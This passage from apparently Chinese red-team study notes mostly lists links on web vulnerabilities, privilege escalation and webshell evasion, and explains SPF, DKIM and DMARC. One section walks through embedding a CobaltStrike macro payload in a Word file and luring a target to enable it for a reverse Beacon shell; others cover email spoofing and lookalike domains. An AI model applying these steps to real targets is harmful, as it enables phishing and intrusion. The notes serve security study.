Xss</h3><p>Pentesterlab是一个靶机环境</p><p><a target="_blank" rel="noopener" href="https://pentesterlab.com/">https://pentesterlab.com/</a> –官网<br><a target="_blank" rel="noopener" href="https://download.vulnhub.com/pentesterlab/web_for_pentester_i386.iso">https://download.vulnhub.com/pentesterlab/web_for_pentester_i386.iso</a> –安装包</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/he_and/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">79798958</span>
https:<span class="hljs-regexp">//</span>www.andseclab.com<span class="hljs-regexp">/2018/</span><span class="hljs-number">11</span><span class="hljs-regexp">/11/</span>pentesterlab-xss题解/
http:<span class="hljs-regexp">//</span>secpark.com.cn<span class="hljs-regexp">/articles/</span><span class="hljs-number">2018</span><span class="hljs-regexp">/05/</span><span class="hljs-number">28</span>/<span class="hljs-number">1527502530234</span>.html   --很直观</code></pre><p>三篇文章详细讲解了pentesterlab靶机进行XSS渗透！！！</p><hr><h3 id="Office宏的基本利用"><a href="#Office宏的基本利用" class="headerlink" title="Office宏的基本利用"></a>Office宏的基本利用</h3><h4 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a><strong>前言</strong></h4><p>Office宏，译自英文单词Macro。宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。而宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上</p><p>Visual Basic for Applications（VBA）是Visual Basic的一种宏语言，是微软开发出来在其桌面应用程序中执行通用的自动化(OLE)任务的编程语言。主要能用来扩展Windows的应用程序功能，特别是Microsoft Office软件，也可说是一种应用程式视觉化的Basic 脚本</p><h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a><strong>环境准备</strong></h4><pre><code class="hljs apache"><span class="hljs-attribute">Windows</span> <span class="hljs-number">7</span> x<span class="hljs-number">64</span> 旗舰版
<span class="hljs-attribute">Microsoft</span> Office <span class="hljs-number">2016</span>
<span class="hljs-attribute">CobaltStrike</span> <span class="hljs-number">4</span></code></pre><h4 id="CobaltStrike生成宏"><a href="#CobaltStrike生成宏" class="headerlink" title="CobaltStrike生成宏"></a><strong>CobaltStrike生成宏</strong></h4><p>先利用CobaltStrike生成宏payload，接下来只要放入word、excel或ppt即可<br><img src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/10.png" srcset="/img/loading.gif" alt="生成宏"></p><p><img src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/11.png" srcset="/img/loading.gif" alt="生成宏"></p><h4 id="创建宏Word"><a href="#创建宏Word" class="headerlink" title="创建宏Word"></a><strong>创建宏Word</strong></h4><p>打开Word文档，点击 “Word 选项 — 自定义功能区 — 开发者工具(勾选) — 确定”<br><img src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/12.png" srcset="/img/loading.gif" alt="创建宏Word"><br>编写主体内容后，点击 “开发工具 — Visual Basic” 。<br><img src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/13.png" srcset="/img/loading.gif" alt="创建宏Word"><br>双击 “ThisDocument” ，将原有内容全部清空，然后将CobaltStrike生成宏payload全部粘贴进去，保存并关闭该 VBA 编辑器<br><img src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/14.png" srcset="/img/loading.gif" alt="创建宏Word"><br>另存为的Word类型务必要选”Word 97-2003 文档 (*.doc)”，即 doc 文件，保证低版本可以打开。之后关闭，再打开即可执行宏代码<br><img src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/15.png" srcset="/img/loading.gif" alt="创建宏Word"><br><strong>反弹Beacon shell</strong><br>默认情况下，Office已经禁用所有宏，但仍会在打开Word文档的时候发出通知</p><p>诱导目标手动点击”启用内容”宏。<br><img src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/16.png" srcset="/img/loading.gif" alt="反弹Beacon shell"><br>目标一旦启用，CobaltStrike的Beacon就会上线，即成功接收到Shell<br><img src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/17.png" srcset="/img/loading.gif" alt="反弹Beacon shell"></p><p>参考文章：</p><ul><li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98526727">https://zhuanlan.zhihu.com/p/98526727</a> –感谢我不是大神的文章</li></ul><hr><h3 id="Discuz-Ssrf-Rce漏洞分析报告"><a href="#Discuz-Ssrf-Rce漏洞分析报告" class="headerlink" title="Discuz Ssrf Rce漏洞分析报告"></a>Discuz Ssrf Rce漏洞分析报告</h3><p>很老的一个漏洞了</p><ul><li><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1511949">https://cloud.tencent.com/developer/article/1511949</a> —复现</p></li><li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2018">https://xz.aliyun.com/t/2018</a> —Discuz!因Memcached未授权访问导致的RCE</p></li><li><p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/76754.html">https://cn-sec.com/archives/76754.html</a> —<a target="_blank" rel="noopener" href="https://cn-sec.com/archives/76754.html">https://cn-sec.com/archives/76754.html</a></p></li><li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/191698.html">https://www.freebuf.com/vuls/191698.html</a> —Discuz x3.4前台SSRF漏洞分析</p></li></ul><ul><li><a target="_blank" rel="noopener" href="https://hackmd.io/@Lhaihai/H1B8PJ9hX">https://hackmd.io/@Lhaihai/H1B8PJ9hX</a> –SSRF集合笔记</li></ul><hr><h3 id="WordPress语言文件代码执行漏洞分析"><a href="#WordPress语言文件代码执行漏洞分析" class="headerlink" title="WordPress语言文件代码执行漏洞分析"></a>WordPress语言文件代码执行漏洞分析</h3><p>参考：</p><ul><li><p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-92459">https://www.seebug.org/vuldb/ssvid-92459</a></p></li><li><p><a target="_blank" rel="noopener" href="https://gist.github.com/anonymous/908a087b95035d9fc9ca46cef4984e97">https://gist.github.com/anonymous/908a087b95035d9fc9ca46cef4984e97</a></p></li><li><p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.create-function.php">http://php.net/manual/zh/function.create-function.php</a></p></li><li><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/32416/">https://www.exploit-db.com/exploits/32416/</a></p></li><li><p><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=48231">https://bugs.php.net/bug.php?id=48231</a></p></li><li><p><a target="_blank" rel="noopener" href="http://www.2cto.com/Article/201212/177146.html">http://www.2cto.com/Article/201212/177146.html</a></p></li><li><p><a target="_blank" rel="noopener" href="https://codex.wordpress.org/InstallingWordPressinYourLanguage">https://codex.wordpress.org/InstallingWordPressinYourLanguage</a></p></li></ul><ul><li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1078451">https://cloud.tencent.com/developer/article/1078451</a> –正文，感谢</li></ul><hr><h3 id="Struts2远程命令执行s2-048漏洞分析报告"><a href="#Struts2远程命令执行s2-048漏洞分析报告" class="headerlink" title="Struts2远程命令执行s2-048漏洞分析报告"></a>Struts2远程命令执行s2-048漏洞分析报告</h3><ul><li><a target="_blank" rel="noopener" href="https://www.ichunqiu.com/course/58753">https://www.ichunqiu.com/course/58753</a> –春秋视频讲解</li></ul><ul><li><a target="_blank" rel="noopener" href="http://blog.topsec.com.cn/strutss2-048%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://blog.topsec.com.cn/strutss2-048远程命令执行漏洞分析/</a> –阿尔法实验室</li></ul><ul><li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/140410.html">https://www.freebuf.com/vuls/140410.html</a> –复现</p></li><li><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/05efdc8f4301">https://www.jianshu.com/p/05efdc8f4301</a> –复现</p></li><li><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/356291fb26a2">https://www.jianshu.com/p/356291fb26a2</a> –复现</p></li></ul><ul><li><a target="_blank" rel="noopener" href="https://www.zybuluo.com/Dukebf/note/821989">https://www.zybuluo.com/Dukebf/note/821989</a> –strut2各版本漏洞信息整理</li></ul><p>很老的一个漏洞了…学习下思路~~</p><hr><h3 id="静态免杀php一句话（已过D盾，河马，安全狗）"><a href="#静态免杀php一句话（已过D盾，河马，安全狗）" class="headerlink" title="静态免杀php一句话（已过D盾，河马，安全狗）"></a>静态免杀php一句话（已过D盾，河马，安全狗）</h3><ul><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ABKing/p/13515014.html">https://www.cnblogs.com/ABKing/p/13515014.html</a> –2020年8月最新一句话木马免杀（截止2020年8月16日通杀D盾、安全狗，微步，webshellKiller）</li></ul><ul><li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug">https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug</a> –2020年8月如何优雅的隐藏你的webshell</li></ul><p>还有很多方法，这里书籍上的方法未找到，可看书！！</p><hr><h3 id="金融信息系统安全测评方法（不公布！）"><a href="#金融信息系统安全测评方法（不公布！）" class="headerlink" title="金融信息系统安全测评方法（不公布！）"></a>金融信息系统安全测评方法（不公布！）</h3><ul><li><a target="_blank" rel="noopener" href="http://www.djbh.net/webdev/file/webFiles/File/jsbz/201232310276.pdf">http://www.djbh.net/webdev/file/webFiles/File/jsbz/201232310276.pdf</a> —信息安全技术信息安全风险评估规范</li></ul><ul><li><a target="_blank" rel="noopener" href="http://www.djbh.net/webdev/file/webFiles/File/zcbz/201226173039.pdf">http://www.djbh.net/webdev/file/webFiles/File/zcbz/201226173039.pdf</a> —信息安全技术信息系统安全管理要求</li></ul><p>学习下就好！！！</p><p>随着大数据、云计算、人工智能及区块链等新兴技术的应用,银行业手机银行、微信银行等新兴数字化金通过安全测评过程，全面分析出信息系统可能存在的人为破坏场景及其成因与后果，通过科学有效的测试</p><p>所以才提起金融信息系统安全测评方法这块内容的警惕，这里只能看书，网上应该是封了大部分资料书内容很全！！</p><hr><h3 id="Apache-Poi-XXE-Analysis"><a href="#Apache-Poi-XXE-Analysis" class="headerlink" title="Apache-Poi-XXE-Analysis"></a>Apache-Poi-XXE-Analysis</h3><ul><li><a target="_blank" rel="noopener" href="https://b1ue.cn/archives/241.html">Apache POI &lt;= 4.1.0 XXE 漏洞 (CVE-2019-12415)</a></li></ul><p>参考文章：</p><ul><li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6996">https://xz.aliyun.com/t/6996</a> —本文复现文章</li></ul><hr><h3 id="记一次阿里主站xss测试及绕过waf防护"><a href="#记一次阿里主站xss测试及绕过waf防护" class="headerlink" title="记一次阿里主站xss测试及绕过waf防护"></a>记一次阿里主站xss测试及绕过waf防护</h3><p>使用工具：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/chaitin/</span>xray</code></pre><ul><li><a target="_blank" rel="noopener" href="https://www.loongten.com/2019/12/20/find-alibaba-xss/">https://www.loongten.com/2019/12/20/find-alibaba-xss/</a> –一枚阿里巴巴主站XSS挖掘之旅</li></ul><p>书里也有另外的思路，大部分都是各种倒腾方法测试，前面也列举了很多，未授权的别乱搞！！</p><h3 id="ClassLoader类加载机制"><a href="#ClassLoader类加载机制" class="headerlink" title="ClassLoader类加载机制"></a>ClassLoader类加载机制</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>javasec.org<span class="hljs-regexp">/javase/</span>ClassLoader/</code></pre><p>该网站是JAVA非常好的一个学习页面，前面也推荐过了，这里提到ClassLoader再次推下！！</p><hr><h3 id="浅谈SSRF原理及其利用"><a href="#浅谈SSRF原理及其利用" class="headerlink" title="浅谈SSRF原理及其利用"></a>浅谈SSRF原理及其利用</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>teamssix.com<span class="hljs-regexp">/year/</span><span class="hljs-number">191222</span>-<span class="hljs-number">192227</span>.html</code></pre><hr><pre><code class="hljs awk">参考文章
https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2115</span>
http:<span class="hljs-regexp">//</span>www.liuwx.cn/penetrationtest-<span class="hljs-number">3</span>.html
https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/yuzly/</span>p/<span class="hljs-number">10903398</span>.html
https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/vulhub/</span>vulhub<span class="hljs-regexp">/tree/m</span>aster<span class="hljs-regexp">/weblogic/</span>ssrf
https:<span class="hljs-regexp">//</span>www.netsparker.com<span class="hljs-regexp">/blog/</span>web-security<span class="hljs-regexp">/server-side-request-forgery-vulnerability-ssrf/</span></code></pre><hr><h3 id="Spring-Data-Commons-CVE-2018-1273"><a href="#Spring-Data-Commons-CVE-2018-1273" class="headerlink" title="Spring-Data-Commons (CVE-2018-1273)"></a>Spring-Data-Commons (CVE-2018-1273)</h3><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://blog.nsfocus.net/cve-<span class="hljs-number">2018</span>-<span class="hljs-number">1273</span>-analysis/		自行搭建复现
<span class="hljs-attribute">https</span>://pianshen.com/article/<span class="hljs-number">9248784281</span>/     vulhub靶机复现
<span class="hljs-attribute">http</span>://xxlegend.com/<span class="hljs-number">2018</span>/<span class="hljs-number">04</span>/<span class="hljs-number">12</span>/CVE-<span class="hljs-number">2018</span>-<span class="hljs-number">1273</span>-%<span class="hljs-number">20</span>RCE%<span class="hljs-number">20</span>with%<span class="hljs-number">20</span>Spring%<span class="hljs-number">20</span>Data%<span class="hljs-number">20</span>Commons%<span class="hljs-number">20</span>%E<span class="hljs-number">5</span>%<span class="hljs-number">88</span>%<span class="hljs-number">86</span>%E<span class="hljs-number">6</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">90</span>%E<span class="hljs-number">6</span>%<span class="hljs-number">8</span>A%A<span class="hljs-number">5</span>%E<span class="hljs-number">5</span>%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>A/</code></pre><p>听老的漏洞了，可以玩玩</p><hr><h3 id="xss绕过代码后端长度限制的方法"><a href="#xss绕过代码后端长度限制的方法" class="headerlink" title="xss绕过代码后端长度限制的方法"></a>xss绕过代码后端长度限制的方法</h3><p>参考链接:</p><ul><li><a target="_blank" rel="noopener" href="https://www.shangyexinzhi.com/article/387056.html">https://www.shangyexinzhi.com/article/387056.html</a> –该文章</li><li><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/221882.html">https://www.freebuf.com/column/221882.html</a> –加深</li></ul><hr><h3 id="mysql提权之mof"><a href="#mysql提权之mof" class="headerlink" title="mysql提权之mof"></a>mysql提权之mof</h3><ul><li><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6dbac868e2ab">https://www.jianshu.com/p/6dbac868e2ab</a></p></li><li><p><a target="_blank" rel="noopener" href="https://pino-hd.github.io/2018/06/10/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BMOF/">https://pino-hd.github.io/2018/06/10/MySQL提权之MOF/</a></p></li><li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/h4ck0ne/p/5154629.html">https://www.cnblogs.com/h4ck0ne/p/5154629.html</a></p></li></ul><hr><h3 id="mysql提权之udf"><a href="#mysql提权之udf" class="headerlink" title="mysql提权之udf"></a>mysql提权之udf</h3><ul><li><a target="_blank" rel="noopener" href="http://www.oniont.cn/index.php/archives/310.html">http://www.oniont.cn/index.php/archives/310.html</a></li><li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/5b34c1b6dee7">https://www.jianshu.com/p/5b34c1b6dee7</a></li></ul><hr><h3 id="XSS-基础学习"><a href="#XSS-基础学习" class="headerlink" title="XSS 基础学习"></a>XSS 基础学习</h3><pre><code class="hljs xquery">https://baike.baidu.com/<span class="hljs-type">item</span>/XSS<span class="hljs-meta">%E6</span><span class="hljs-meta">%94</span><span class="hljs-meta">%BB</span><span class="hljs-meta">%E5</span><span class="hljs-meta">%87</span><span class="hljs-meta">%BB</span>   百度百科</code></pre><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">24</span>a19c6434ae   --最新累积</code></pre><p>还有书中知识！！！</p><hr><h3 id="java-反射与内存shell-初探-基于jetty容器的shell-维权"><a href="#java-反射与内存shell-初探-基于jetty容器的shell-维权" class="headerlink" title="java 反射与内存shell 初探-基于jetty容器的shell 维权"></a>java 反射与内存shell 初探-基于jetty容器的shell 维权</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>web/<span class="hljs-number">172753</span>.html    ---利用“进程注入”实现无文件复活 WebShell
http:<span class="hljs-regexp">//</span>qiushao.net<span class="hljs-regexp">/2020/</span><span class="hljs-number">02</span><span class="hljs-regexp">/15/</span>Java<span class="hljs-regexp">/Java-反射机制介绍/</span>
https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/jingmoxukong/</span>p/<span class="hljs-number">12049112</span>.html   ---深入理解 Java 反射和动态代理 
http:<span class="hljs-regexp">//</span>rui0.cn<span class="hljs-regexp">/archives/</span><span class="hljs-number">1408</span><span class="hljs-comment">#more-1408    --前面了解了一些基础和知识，这是内存shell深入的理解，感谢大佬</span></code></pre><p>书籍上还有不同的思路…</p><hr><h3 id="利用-DNSLOG回显"><a href="#利用-DNSLOG回显" class="headerlink" title="利用 DNSLOG回显"></a>利用 DNSLOG回显</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">98096</span>   --实战
https:<span class="hljs-regexp">//</span>codingnote.cc<span class="hljs-regexp">/p/</span><span class="hljs-number">113368</span>   --基础原理</code></pre><p>书籍上还有不同的思路…</p><hr><h3 id="文件合成-图片马生成"><a href="#文件合成-图片马生成" class="headerlink" title="文件合成/图片马生成"></a>文件合成/图片马生成</h3><p>指的是代码写入后不破坏图片为前提,图片仍可正常打开</p><ul><li><a target="_blank" rel="noopener" href="https://bbs.zkaq.cn/?t/159.html">https://bbs.zkaq.cn/?t/159.html</a></li><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/ltysg0645/article/details/53996658">https://blog.csdn.net/ltysg0645/article/details/53996658</a></li></ul><hr><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><ul><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/12989830.html">https://www.cnblogs.com/zzjdbk/p/12989830.html</a> —MySQL提权之udf提权(获得webshell的情况)</li><li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/5b34c1b6dee7">https://www.jianshu.com/p/5b34c1b6dee7</a> –另外的思路</li></ul><hr><h2 id="3、社会工程学"><a href="#3、社会工程学" class="headerlink" title="3、社会工程学"></a>3、社会工程学</h2><h3 id="水坑攻击"><a href="#水坑攻击" class="headerlink" title="水坑攻击"></a>水坑攻击</h3><p>“水坑攻击”，黑客攻击方式之一，顾名思义，是在受害者必经之路设置了一个“水坑(陷阱)”。最常见的做法是，黑客分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，先将此网站“攻破”并植入攻击代码，一旦攻击目标访问该网站就会“中招”。</p><p>由于此种攻击借助了目标团体所信任的网站，攻击成功率很高，即便是那些对鱼叉攻击或其他形式的钓鱼攻击具有防护能力的团体</p><p>水坑攻击属于APT攻击的一种，与钓鱼攻击相比，黑客无需耗费精力制作钓鱼网站，而是利用合法网站的弱点，隐蔽性比较强。在人们安全意识不断加强的今天，黑客处心积虑地制作钓鱼网站却被有心人轻易识破，而水坑攻击则利用了被攻击者对网站的信任。</p><p>水坑攻击利用网站的弱点在其中植入攻击代码，攻击代码利用浏览器的缺陷，被攻击者访问网站时终端会被植入恶意程序或者直接被盗取个人重要信息。</p><p>水坑攻击相对于通过社会工程方式引诱目标用户访问恶意网站更具欺骗性，效率也更高。水坑方法主要被用于有针对性的攻击，而Adobe Reader、Java运行时环境（JRE）、Flash和IE中的零漏洞被用于安装恶意软件</p><ul><li><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB/17644830">https://baike.baidu.com/item/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB/17644830</a></li></ul><hr><h3 id="鱼叉攻击"><a href="#鱼叉攻击" class="headerlink" title="鱼叉攻击"></a>鱼叉攻击</h3><p>“鱼叉攻击”是黑客攻击方式之一，最常见的做法是，将木马程序作为电子邮件的附件，并起上一个极具诱惑力的名称，发送给目标电脑，诱使受害者打开附件，从而感染木马。</p><ul><li><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB">https://baike.baidu.com/item/鱼叉攻击</a></li></ul><h4 id="Swaks-邮件伪造"><a href="#Swaks-邮件伪造" class="headerlink" title="Swaks-邮件伪造"></a>Swaks-邮件伪造</h4><ul><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhaijiahui/p/11494626.html">https://www.cnblogs.com/zhaijiahui/p/11494626.html</a></li></ul><p>瑞士军刀还是很有名的，熟悉下原理和简单的 –to –from –attach –data –elho这几种使用意思就OK了…</p><hr><h4 id="邮件伪造防御技术"><a href="#邮件伪造防御技术" class="headerlink" title="邮件伪造防御技术"></a>邮件伪造防御技术</h4><h5 id="SPF"><a href="#SPF" class="headerlink" title="SPF"></a>SPF</h5><p>SPF是 Sender Policy Framework 的缩写，一种以IP地址认证电子邮件发件人身份的技术，是为了防范垃圾邮件而提出来的一种DNS记录类型，它是一种TXT类型的记录。 接收邮件方会首先检查域名的SPF记录，来确定发件人的IP地址是否被包含在SPF记录里面，如果在，就认为是一封正确的邮件，否则会认为是一封伪造的邮件进行退回。</p><p>SPF可以防止别人伪造你来发邮件，是一个反伪造性邮件的解决方案。当你定义了你域名的SPF记录之后， 接收邮件方会根据你的SPF记录来确定连接过来的IP地址是否被包含在SPF记录里面，如果在，则认为是一封正确的邮件，否则则认为是一封伪造的邮件。</p><p>设置正确的 SPF 记录可以提高邮件系统发送外域邮件的成功率，也可以一定程度上防止别人假冒你的域名发邮件。</p><ul><li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/b3460757d260">https://www.jianshu.com/p/b3460757d260</a> –使用方法</li></ul><h5 id="DKIM"><a href="#DKIM" class="headerlink" title="DKIM"></a>DKIM</h5><p>DKIM是一种防范电子邮件欺诈的验证技术，通过消息加密认证的方式对邮件发送域名进行验证。</p><p>邮件发送方发送邮件时，利用本域私钥加密邮件生成DKIM签名，将DKIM签名及其相关信息插入邮件头。邮件接收方接收邮件时，通过DNS查询获得公钥，验证邮件DKIM签名的有效性。从而确认在邮件发送的过程中，防止邮件被恶意篡改，保证邮件内容的完整性</p><ul><li>DKIM RFC协议：<a target="_blank" rel="noopener" href="http://tools.ietf.org/html/rfc6376">http://tools.ietf.org/html/rfc6376</a></li><li>DKIM官方网站：<a target="_blank" rel="noopener" href="http://www.dkim.org/">http://www.dkim.org/</a></li></ul><h5 id="DMARC"><a href="#DMARC" class="headerlink" title="DMARC"></a>DMARC</h5><p>DMARC是一种基于现有的SPF和DKIM协议的可扩展电子邮件认证协议，在邮件收发双方建立了邮件反馈机制，便于邮件发送方和邮件接收方共同对域名的管理进行完善和监督。</p><p>DMARC要求域名所有者在DNS记录中设置SPF记录和DKIM记录，并明确声明对验证失败邮件的处理策略。邮件接收方接收邮件时，首先通过DNS获取DMARC记录，再对邮件来源进行SPF验证和DKIM验证，对验证失败的邮件根据DMARC记录进行处理，并将处理结果反馈给发送方。</p><p>DMARC能够有效识别并拦截欺诈邮件和钓鱼邮件，保障用户个人信息安全。</p><p>设置完 SPF 和 DKIM 后，您就能以 TXT 记录的形式向您网域的 DNS 记录添加政策，从而配置 DMARC（方法与配置 SPF 或 ADSP 一样）</p><ul><li><p><a target="_blank" rel="noopener" href="https://support.google.com/a/answer/2466563?hl=zh-Hans">https://support.google.com/a/answer/2466563?hl=zh-Hans</a></p></li><li><p><a target="_blank" rel="noopener" href="https://dmarc.org//draft-dmarc-base-00-01.html#iana_dmarc_tags">https://dmarc.org//draft-dmarc-base-00-01.html#iana_dmarc_tags</a></p></li><li><p>DMARC RFC协议：<a target="_blank" rel="noopener" href="http://tools.ietf.org/html/rfc7489">http://tools.ietf.org/html/rfc7489</a></p></li><li><p>DMARC官方网站：<a target="_blank" rel="noopener" href="https://dmarc.org/">https://dmarc.org/</a></p></li></ul><hr><h3 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h3><p>钓鱼式攻击是一种企图从电子通讯中，通过伪装成信誉卓著的法人媒体以获得如用户名、密码和信用卡明细等个人敏感信息的犯罪诈骗过程。这些通信都声称(自己)来自社交网站拍卖网站网络银行、电子支付网站或网络管理者，以此来诱骗受害人的轻信。网钓通常是通过e-mail或者即时通讯进行。它常常导引用户到∪RL与界面外观与真正网站几无二致的假冒网站输入个人数据。就算使用强式加密的SSL服务器认证，要侦测网站是否仿冒实际上仍很困难。</p><ul><li><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%92%93%E9%B1%BC%E5%BC%8F%E6%94%BB%E5%87%BB">https://zh.wikipedia.org/wiki/钓鱼式攻击</a></li></ul><h4 id="视觉效果"><a href="#视觉效果" class="headerlink" title="视觉效果"></a>视觉效果</h4><p>某次应急响应中，从A客户（跨国经销商）那里了解到的情况如下：</p><pre><code class="hljs dns"><span class="hljs-keyword">A</span>是商家 
B商家的消费者 
C黑客</code></pre><p>C攻入了A的邮件服务器，并且持续控制了一个季度，共3个月。</p><p>B要购买A的产品时，A发送合同给B，同时C的木马也在读取邮件数据库的内容，合同中有付款账户，C从中截获A的邮件，并且修改合同内容，从邮件服务器拉取到了前一年的合同模板，将银行账户打印上去，B收到C的合同后迸行了打款，同时B在向A确认的过程中，A发现B受骗了。</p><p>思考:</p><pre><code class="hljs mathematica"><span class="hljs-built_in">C</span>怎么给<span class="hljs-variable">B</span>发送的邮件<span class="hljs-operator">,</span>取得了<span class="hljs-variable">B</span>的信任呢<span class="hljs-operator">?</span></code></pre><p>这里举个例子: <code>fish.com</code>与 <code>fish.corn</code></p><p>乍一看，<code>fish.com</code>中的<code>com</code>与<code>corn</code>非常相似，有个别字体影响的话，还是很难分辨的，更别说歪果仁了…</p><p><strong>宋体</strong></p><p><strong>娃娃体</strong></p><hr><h4 id="凭证劫持"><a href="#凭证劫持" class="headerlink" title="凭证劫持"></a>凭证劫持</h4><p><strong>漏洞危害</strong></p><p>劫持凭证，构造链接登录受害者账号</p><p><strong>文章：</strong></p><ul><li><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/69153.html">https://cn-sec.com/archives/69153.html</a></li><li><a target="_blank" rel="noopener" href="https://sec.thief.one/article_content?a_id=a6dd0c77f46b5dd7030c79d3e24f804a">https://sec.thief.one/article_content?a_id=a6dd0c77f46b5dd7030c79d3e24f804a</a></li></ul><p>雷神众测原文被删了好像…</p><hr><h4 id="克隆技术"><a href="#克隆技术" class="headerlink" title="克隆技术"></a>克隆技术</h4><ul><li><p><a target="_blank" rel="noopener" 